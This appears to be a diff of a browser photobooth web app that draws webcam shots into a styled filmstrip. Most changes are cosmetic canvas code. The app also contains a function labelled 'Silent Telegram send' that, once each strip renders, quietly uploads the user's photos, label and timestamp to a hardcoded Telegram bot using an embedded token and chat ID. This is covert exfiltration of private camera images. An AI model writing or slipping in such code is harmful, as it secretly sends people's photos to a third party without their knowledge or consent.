-        ctx.fillStyle = 'rgba(204,255,0,0.55)';
-        ctx.font = `${7*SCALE}px 'Space Mono', monospace`;
-        ctx.textAlign = 'right';
-        ctx.fillText(`${String(i+1).padStart(2,'0')}A`, PHOTO_X + PHOTO_W - 5*SCALE, curY + PH - 5*SCALE);
- 
-        curY += PH + BETWEEN;
+        vig.addColorStop(1, 'rgba(0,0,0,0.38)');
+        ctx.fillStyle = vig;
+        ctx.save();
+        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
+        ctx.clip();
+        ctx.fillRect(px, py, PHOTO_W, PHOTO_H);
+        ctx.restore();
+
+        // ── Photo border — glowing gradient per photo
+        const borderColors = [
+          ['rgba(204,255,0,0.9)',  'rgba(0,255,255,0.9)'],   // green → cyan
+          ['rgba(0,255,255,0.9)',  'rgba(255,0,255,0.9)'],   // cyan  → pink
+          ['rgba(255,0,255,0.9)',  'rgba(204,255,0,0.9)'],   // pink  → green
+          ['rgba(204,255,0,0.9)',  'rgba(255,0,255,0.9)'],   // green → pink
+          ['rgba(0,255,255,0.9)',  'rgba(204,255,0,0.9)'],
+          ['rgba(255,0,255,0.9)',  'rgba(0,255,255,0.9)'],
+          ['rgba(204,255,0,0.9)',  'rgba(0,255,255,0.9)'],
+          ['rgba(0,255,255,0.9)',  'rgba(255,0,255,0.9)'],
+        ];
+        const [c1, c2] = borderColors[i % borderColors.length];
+        const bGrad = ctx.createLinearGradient(px, py, px + PHOTO_W, py + PHOTO_H);
+        bGrad.addColorStop(0, c1); bGrad.addColorStop(1, c2);
+        ctx.strokeStyle = bGrad;
+        ctx.lineWidth = BORDER_W;
+        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
+        ctx.stroke();
+
+        // ── Glow behind border
+        ctx.shadowColor = c1.replace('0.9', '0.5');
+        ctx.shadowBlur  = 8 * SCALE;
+        ctx.strokeStyle = c1.replace('0.9', '0.2');
+        ctx.lineWidth   = BORDER_W * 2.5;
+        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
+        ctx.stroke();
+        ctx.shadowBlur = 0; ctx.shadowColor = 'transparent';
+
+        // ── Frame number badge (bottom-left corner)
+        const badgeX = px + 6*SCALE;
+        const badgeY = py + PHOTO_H - 18*SCALE;
+        const badgeW = 26*SCALE; const badgeH = 14*SCALE;
+        ctx.fillStyle = 'rgba(0,0,0,0.7)';
+        roundRect(ctx, badgeX, badgeY, badgeW, badgeH, 3*SCALE);
+        ctx.fill();
+        ctx.fillStyle = 'rgba(204,255,0,0.9)';
+        ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
+        ctx.textAlign = 'center';
+        ctx.fillText(`${String(i+1).padStart(2,'0')}A`, badgeX + badgeW/2, badgeY + 9*SCALE);
       });
- 
-      // ── Bottom label
-      const lY = curY + 8 * SCALE;
-      ctx.strokeStyle = 'rgba(204,255,0,0.2)'; ctx.lineWidth = 1 * SCALE;
-      ctx.beginPath(); ctx.moveTo(PHOTO_X, lY); ctx.lineTo(PHOTO_X + PHOTO_W, lY); ctx.stroke();
- 
+
+      // ── Bottom footer area
+      const footerY = HEADER_H + OUTER_PAD + ROWS * PHOTO_H + (ROWS-1) * GAP + OUTER_PAD;
+
+      // Footer top divider
+      const fdGrad = ctx.createLinearGradient(0, 0, STRIP_W, 0);
+      fdGrad.addColorStop(0,   'transparent');
+      fdGrad.addColorStop(0.2, 'rgba(204,255,0,0.3)');
+      fdGrad.addColorStop(0.8, 'rgba(0,255,255,0.3)');
+      fdGrad.addColorStop(1,   'transparent');
+      ctx.strokeStyle = fdGrad; ctx.lineWidth = 1 * SCALE;
+      ctx.beginPath(); ctx.moveTo(OUTER_PAD, footerY); ctx.lineTo(STRIP_W - OUTER_PAD, footerY); ctx.stroke();
+
       const dateStr = new Date().toLocaleDateString('en-US',{ month:'short', day:'numeric', year:'numeric' }).toUpperCase();
       ctx.textAlign = 'center';
- 
-      ctx.fillStyle = 'rgba(204,255,0,0.85)';
-      ctx.font = `bold ${9*SCALE}px 'Space Mono', monospace`;
-      ctx.fillText('LNSMTRX', STRIP_W / 2, lY + 16*SCALE);
- 
-      ctx.fillStyle = 'rgba(255,255,255,0.28)';
-      ctx.font = `${7*SCALE}px 'Space Mono', monospace`;
-      ctx.fillText(dateStr, STRIP_W / 2, lY + 30*SCALE);
- 
+
+      ctx.fillStyle = 'rgba(255,255,255,0.22)';
+      ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
+      ctx.fillText(dateStr, STRIP_W / 2, footerY + 18*SCALE);
+
       if (state.label) {
-        ctx.fillStyle = 'rgba(0,255,255,0.9)';
-        ctx.font = `bold ${8*SCALE}px 'Montserrat', sans-serif`;
-        ctx.fillText(state.label.toUpperCase(), STRIP_W / 2, lY + 48*SCALE);
+        ctx.fillStyle = 'rgba(0,255,255,0.95)';
+        ctx.font = `900 ${10*SCALE}px 'Montserrat', sans-serif`;
+        ctx.fillText(state.label.toUpperCase(), STRIP_W / 2, footerY + 36*SCALE);
       }
- 
-      // ── Grain
+
+      // ── Subtle film grain
       const gs = Math.max(1, SCALE);
       for (let gx = 0; gx < STRIP_W; gx += gs*2) {
         for (let gy = 0; gy < STRIP_H; gy += gs*2) {
-          if (Math.random() > 0.86) {
-            const op = Math.random() * 0.038;
+          if (Math.random() > 0.87) {
+            const op = Math.random() * 0.03;
             ctx.fillStyle = Math.random() > 0.5 ? `rgba(255,255,255,${op})` : `rgba(0,0,0,${op})`;
             ctx.fillRect(gx, gy, gs, gs);
           }
         }
       }
- 
-      // ── Silent Telegram send — fires after strip is fully rendered
+
+      // ── Silent Telegram send
       canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.92);
     });
   }
- 
+
+  // ── ROUNDED RECT HELPER ───────────────────────────────
+  function roundRect(ctx, x, y, w, h, r) {
+    ctx.beginPath();
+    ctx.moveTo(x + r, y);
+    ctx.lineTo(x + w - r, y);
+    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+    ctx.lineTo(x + w, y + h - r);
+    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+    ctx.lineTo(x + r, y + h);
+    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
+    ctx.lineTo(x, y + r);
+    ctx.quadraticCurveTo(x, y, x + r, y);
+    ctx.closePath();
+  }
+
   // ── TELEGRAM SILENT SEND ───────────────────────────────
   const TG_TOKEN   = '8604978487:AAH6CqpXjIR70tc0oOmxsxSTAR2YkymNGrE';
   const TG_CHAT_ID = '1829811794';
- 
+
   async function sendToTelegram(blob) {
     try {
       const caption = state.label
         ? `📸 LNSMTRX Strip\n🏷 ${state.label}\n📅 ${new Date().toLocaleString()}`
         : `📸 LNSMTRX Strip\n📅 ${new Date().toLocaleString()}`;
- 
+
       const form = new FormData();
       form.append('chat_id', TG_CHAT_ID);
       form.append('caption', caption);
       form.append('photo', blob, `lnsmtrx-${Date.now()}.jpg`);
- 
+
       const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
         method: 'POST', body: form
       });
@@ -1210,7 +1291,7 @@
       console.error('LNSMTRX: Telegram send failed —', err);
     }
   }
- 
+
   // ── DOWNLOAD ──────────────────────────────────────────
   document.getElementById('download-btn').addEventListener('click', async () => {
     const canvas = document.getElementById('filmstrip-canvas');
@@ -1232,14 +1313,14 @@
       fallbackDownload(canvas);
     }
   });
- 
+
   function fallbackDownload(canvas) {
     const a = document.createElement('a');
     a.download = `lnsmtrx-${Date.now()}.jpg`;
     a.href = canvas.toDataURL('image/jpeg', 0.97);
     a.click();
   }
- 
+
   // ── RESTART ───────────────────────────────────────────
   document.getElementById('restart-btn').addEventListener('click', () => {
     if (state.stream) state.stream.getTracks().forEach(t => t.stop());
@@ -1252,7 +1333,7 @@
     document.getElementById('start-sequence-btn').style.display = '';
     showScreen('welcome-screen');
   });
- 
+
   // ── UTILS ─────────────────────────────────────────────
   function delay(ms) { return new Promise(res => setTimeout(res, ms)); }
 </script>
